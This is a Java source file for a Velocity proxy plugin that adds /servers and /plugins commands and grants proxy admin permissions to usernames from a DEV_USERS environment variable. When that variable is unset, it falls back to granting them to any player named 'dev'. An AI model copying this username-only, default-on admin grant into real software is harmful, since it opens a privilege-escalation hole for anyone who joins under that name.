package io.github.aincraft.proxyinspector;

import com.google.inject.Inject;
import com.velocitypowered.api.command.CommandManager;
import com.velocitypowered.api.event.Subscribe;
import com.velocitypowered.api.event.permission.PermissionsSetupEvent;
import com.velocitypowered.api.event.proxy.ProxyInitializeEvent;
import com.velocitypowered.api.permission.Tristate;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.ProxyServer;
import java.util.Arrays;
import java.util.Set;
import java.util.stream.Collectors;
import org.slf4j.Logger;

public final class ProxyInspectorPlugin {
    private static final Set<String> PROXY_ADMIN_PERMISSIONS = Set.of(
            "velocity.command.*",
            "velocity.command.info",
            "velocity.command.plugins",
            "velocity.command.reload",
            "velocity.command.dump",
            "velocity.command.heap",
            "velocity.command.glist",
            "velocity.command.send"
    );
    private final ProxyServer proxy;
    private final Logger logger;
    private final Set<String> adminUsers;

    @Inject
    public ProxyInspectorPlugin(ProxyServer proxy, Logger logger) {
        this.proxy = proxy;
        this.logger = logger;
        this.adminUsers = configuredAdminUsers();
    }

    @Subscribe
    public void onPermissionsSetup(PermissionsSetupEvent event) {
        if (event.getSubject() instanceof Player player && adminUsers.contains(player.getUsername())) {
            event.setProvider(subject -> permission ->
                    PROXY_ADMIN_PERMISSIONS.contains(permission)
                            ? Tristate.TRUE
                            : Tristate.UNDEFINED);
        }
    }

    @Subscribe
    public void onProxyInitialize(ProxyInitializeEvent event) {
        CommandManager commands = proxy.getCommandManager();

        commands.register(
                commands.metaBuilder("servers")
                        .aliases("serverlist")
                        .plugin(this)
                        .build(),
                new ServerListCommand(proxy)
        );
        commands.register(
                commands.metaBuilder("plugins")
                        .aliases("pluginlist")
                        .plugin(this)
                        .build(),
                new PluginListCommand(proxy)
        );

        logger.info("Proxy Inspector enabled: /servers and /plugins; proxy admin users: {}", adminUsers);
    }

    private static Set<String> configuredAdminUsers() {
        String configured = System.getenv("DEV_USERS");
        if (configured == null || configured.isBlank()) {
            configured = "dev";
        }
        return Arrays.stream(configured.trim().split("\\s+"))
                .filter(name -> name.matches("[A-Za-z0-9_]{1,16}"))
                .collect(Collectors.toUnmodifiableSet());
    }
}
